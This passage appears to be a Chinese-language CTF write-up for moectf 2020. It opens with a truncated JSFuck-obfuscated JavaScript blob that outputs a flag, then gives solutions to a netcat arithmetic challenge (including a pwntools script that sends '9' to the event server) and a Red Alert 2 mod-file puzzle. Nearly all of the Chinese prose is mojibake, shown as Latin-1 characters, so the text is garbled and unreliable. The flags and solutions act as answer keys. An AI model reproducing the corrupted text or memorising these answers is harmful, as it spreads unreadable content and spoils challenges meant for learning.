)[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[+!+[]])+[])+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶çœ‹èµ·æ¥æ€ªæ€ªçš„ï¼Œä½†æ˜¯è¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ­£å¸¸çš„jsè„šæœ¬</p>
<p>è¿ç”¨jsçš„ç‰¹æ€§ã€åªé€šè¿‡<code>[]()+!</code>å…­ä¸ªå­—ç¬¦è¿›è¡Œç¼–å†™çš„jsè„šæœ¬è¯­è¨€ç§°ä¹‹ä¸º<strong>JSFUCK</strong></p>
<p>ç›´æ¥å½“æˆå¸¸è§„çš„jsè„šæœ¬è¿è¡Œå³å¯å¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/10/08/U9AtnyfguvRT8Mc.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;J5Fxck_1s_1nt3res7in9!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤"><a href="#â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤" class="headerlink" title="â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤"></a>â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤</h2><blockquote>
<p>æ³¨ï¼šæœ¬é¢˜å€Ÿé‰´äº†moectf2018çš„æŸé“miscé¢˜</p>
</blockquote>
<p>ncï¼Œè¿ä¸Šåå‘ç°é¢˜ç›®ä¼šç»™æˆ‘ä»¬å„ç§ä¸åŒçš„ä»£æ•°ç®—å¼è®©æˆ‘ä»¬è§£ç­”</p>
<p><img src="https://i.loli.net/2020/10/08/zvZ8fL4ajuQrgBR.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°æ— è®ºç®—å¼æ˜¯å•¥ï¼Œåªæœ‰å½“æˆ‘ä»¬è¾“å…¥å­—ç¬¦<code>9</code>çš„æ—¶å€™ç¨‹åºæ‰èƒ½ç»§ç»­è¿è¡Œä¸‹å»ï¼Œæ•…å°è¯•ä¸€ç›´è¾“å…¥<code>9</code></p>
<p>è¾“å…¥99æ¬¡åæˆ‘ä»¬ä¾¿å¾—åˆ°äº†flag</p>
<p><img src="https://i.loli.net/2020/10/08/s3OynaXBTk1hHEG.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;c1rn0_1s_tH3_5tr0n9est!&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨ï¼šæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨pythonè„šæœ¬è‡ªåŠ¨è¾“å…¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'sec.arttnba3.cn'</span>,<span class="number">10001</span>)</span><br><span class="line">result = p.recv()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline(<span class="string">b'9'</span>)</span><br><span class="line">        result = p.recv()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/10/08/JtsWgfSHCvx2TkF.png" alt="image.png"></p>
</blockquote>
<h2 id="é—ª-ç”µ-é£-æš´"><a href="#é—ª-ç”µ-é£-æš´" class="headerlink" title="é—ª ç”µ é£ æš´"></a>é—ª ç”µ é£ æš´</h2><blockquote>
<p> ä¸€é“æ¯”è¾ƒç®€å•çš„æ¸¸æˆå®‰åˆ©é¢˜ï¼ˆç¡®ä¿¡</p>
</blockquote>
<p>é¢˜ç›®åç§°ä¸ºã€é—ªç”µé£æš´ã€‘ï¼Œé—ªç”µé£æš´æ˜¯çº¢è‰²è­¦æˆ’ä¸­ã€ç›Ÿå†›ã€‘é˜µè¥çš„è¶…çº§æ­¦å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨è¿™ä¸ªmodåŒ…ä¸­çš„ç›Ÿå†›å¹¶æ²¡æœ‰ã€å¤©æ°”æ§åˆ¶ä»ªã€‘ï¼Œä¹Ÿå°±æ— æ³•é‡Šæ”¾è¶…çº§æ­¦å™¨ã€é—ªç”µé£æš´ã€‘</p>
<p><img src="https://i.loli.net/2020/10/08/XfNGZtB9IwheKMW.png" alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾çŒœåˆ°åªè¦æŠŠã€å¤©æ°”æ§åˆ¶ä»ªã€‘ä¿®æ”¹å‡ºæ¥ä¾¿å¯ä»¥å¾—åˆ°flag</p>
<p>ç™¾åº¦å¯ä»¥çŸ¥é“çº¢è­¦çš„è§„åˆ™æ–‡ä»¶ä¸º<code>rulesmd.ini</code>ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾æˆ‘ä»¬åœ¨æ–‡ä»¶å¤¹ä¸‹å¹¶ä¸èƒ½å‘ç°è¿™ä¸ªæ–‡ä»¶</p>
<p><img src="https://i.loli.net/2020/10/08/vLb9BGnxU6gXYFj.png" alt="image.png"></p>
<p><strong>å…è´¹çš„hint</strong> æç¤º<code>XCC MIXER</code>ï¼Œç™¾åº¦å¯ä»¥çŸ¥é“è¿™ä¸ªè½¯ä»¶æ˜¯ç”¨æ¥ä»åç¼€åä¸º<code>*.mix</code>çš„æ–‡ä»¶ä¸­æå–æ¸¸æˆèµ„æºæ–‡ä»¶çš„</p>
<p><img src="https://i.loli.net/2020/10/08/A6EFvSJ4iQpjaMs.png" alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾çœ‹åˆ°åŒ…å†…æœ‰å¾ˆå¤šçš„<code>*.mix</code>æ–‡ä»¶ï¼ŒçŒœæµ‹<code>rulesmd.ini</code>å¯èƒ½å­˜åœ¨äºå…¶ä¸­ä¸€ä¸ªå½“ä¸­</p>
<p><img src="https://i.loli.net/2020/10/08/vVABX38Ki6uLrme.png" alt="image.png"></p>
<p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¼šå‘ç°ç›¸å½“ä¸€éƒ¨åˆ†çš„mixæ–‡ä»¶éƒ½æ— æ³•ä½¿ç”¨<code>XCC MIXER</code>æ‰“å¼€ï¼Œè€ƒè™‘åˆ°é¢˜ç›®æ–‡æœ¬ä¸­æœ‰å†™é“ï¼š</p>
<p><img src="https://i.loli.net/2020/10/08/5N9jnd8zmtfwOuE.png" alt="image.png"></p>
<p>æ•…å¯ä»¥å¾—çŸ¥å­˜æ”¾<code>rulesmd.ini</code>çš„mixæ–‡ä»¶åº”è¯¥æ˜¯è¢«åŠ å¯†äº†ï¼ŒåŒæ—¶ç”±äºæˆ‘ä»¬ä¸çŸ¥é“åŠ å¯†æ–¹å¼å¦‚ä½•ï¼Œæ•…å…ˆè€ƒè™‘ä»å…¶ä»–å¯ä»¥æ‰“å¼€çš„mixæ–‡ä»¶ä¸­å¯»æ‰¾æœ‰ç”¨çš„ä¿¡æ¯</p>
<p>åœ¨<code>expandmd94.mix</code>æ–‡ä»¶ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªåå­—å¯ç–‘çš„æ–‡ä»¶ï¼š<code>winhex.shp</code>ï¼Œä½¿ç”¨xcc mixeræå–å‡ºæ¥</p>
<p><img src="https://i.loli.net/2020/10/08/eiczTy3HB5pDmNZ.png" alt="image.png"></p>
<p>è¿˜æ˜¯ç™¾åº¦ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ç§æ–‡ä»¶éœ€è¦ä½¿ç”¨<code>shp builder</code>æ‰“å¼€</p>
<p><img src="https://i.loli.net/2020/10/08/g7BfXK5VFrsjPJ8.png" alt="image.png"></p>
<blockquote>
<h3 id="hint-1"><a href="#hint-1" class="headerlink" title="hint-1"></a>hint-1</h3><p>hint1æç¤ºï¼š</p>
<p><img src="https://i.loli.net/2020/10/08/LCmrMvXi4176Ka8.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç½‘ç›˜çš„åå­—ä¸º<code>arttnba3çš„æ°¸ç¡•ç½‘ç›˜</code>ï¼Œä½†æ˜¯é“¾æ¥å´æ˜¯<a href="http://kiriko.ys168.com" target="_blank" rel="noopener">http://kiriko.ys168.com</a></p>
<p><img src="https://i.loli.net/2020/10/08/uso4xVS6PBq3eKF.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">æ•…æˆ‘ä»¬è€ƒè™‘å°†é“¾æ¥æ”¹ä¸º[http:&#x2F;&#x2F;arttnba3.ys168.com](http:&#x2F;&#x2F;arttnba3.ys168.com)</span><br><span class="line"></span><br><span class="line">è¿›å…¥è¯¥ç½‘ç›˜å³å¯å¾—åˆ°ä¸€å¥—çº¢è­¦ä¿®æ”¹å¸¸ç”¨å·¥å…·ï¼Œå…¶ä¸­å°±åŒ…æ‹¬&#96;&#96;&#96;SHP BUILDER </span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/10/08/WlUKzNnR56c29mA.png" alt="image.png"></p>
</blockquote>
<p>è½¯ä»¶<code>shp builder</code>å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªshpæ–‡ä»¶ä¸€å…±æœ‰114å¸§ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å…¶ä¸­å¤§éƒ¨åˆ†éƒ½æ˜¯çº¯è‰²å¸§ï¼Œè€ƒè™‘ç¥å¿…æ•°å­—<code>114514</code>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬51å¸§å‘ç°ä¸ä¸€æ ·çš„ä¸œè¥¿ï¼Œä½†æ˜¯é¢œè‰²å¾ˆæ˜æ˜¾ä¸å¯¹åŠ²</p>
<p><img src="https://i.loli.net/2020/10/08/naN1Du27iyLxdrU.png" alt="image.png"></p>
<p>è€ç™¾åº¦äººå¯ä»¥çŸ¥é“ä¸€ä¸ªå«åš<code>è°ƒè‰²æ¿</code>çš„ä¸œè¥¿</p>
<p><img src="https://i.loli.net/2020/10/08/l13R46VYfx9eb5a.png" alt="image.png"></p>
<p>ä½¿ç”¨ç¿»è¯‘è½¯ä»¶æˆ‘ä»¬å¯ä»¥çŸ¥é“<code>è°ƒè‰²æ¿</code>çš„è‹±æ–‡æ˜¯<code>palette</code>ï¼Œå¯¹åº”çš„åœ¨<code>shp builder</code>ä¸Šæ–¹æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>palette</code>æŒ‰é’®</p>
<p><img src="https://i.loli.net/2020/10/08/KwufTlbtM7A3r4U.png" alt="image.png"></p>
<p>ç‚¹å‡»é€‰æ‹©<code>Red Alert 2</code>ä¸€æ çš„ç¬¬ä¸€ä¸ª<code>anim.pal</code>ï¼Œæˆ‘ä»¬å‘ç°å›¾ç‰‡å˜å¾—æ­£å¸¸äº†èµ·æ¥</p>
<p><img src="https://i.loli.net/2020/10/08/rp3luSN52OCIAos.png" alt="image.png"></p>
<p>ä½¿ç”¨<code>winhex</code>æ‰“å¼€è¢«åŠ å¯†çš„å‡ ä¸ªmixæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°<code>expandmd98.mix</code>æ–‡ä»¶çš„æœ«å°¾offsetåˆšå¥½ä¹Ÿåœ¨<code>00530F20</code>é™„è¿‘ï¼Œä¸åŒçš„æ˜¯æ¯”<code>winhex.shp</code>ä¸­å¤šäº†ä¸€æ®µ</p>
<p>æˆ‘ä»¬å°è¯•å°†è¿™ä¸€æ®µå¤šå‡ºæ¥çš„æ•°æ®åˆ æ‰åå‘ç°è¯¥æ–‡ä»¶ä¾¿å¯ä»¥ä½¿ç”¨xcc mixeræ‰“å¼€äº†ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°<code>rulesmd.ini</code>æ–‡ä»¶å°±åœ¨é‡Œé¢</p>
<p><img src="https://i.loli.net/2020/10/08/bX3z5lheLdYI79a.png" alt="image.png"></p>
<blockquote>
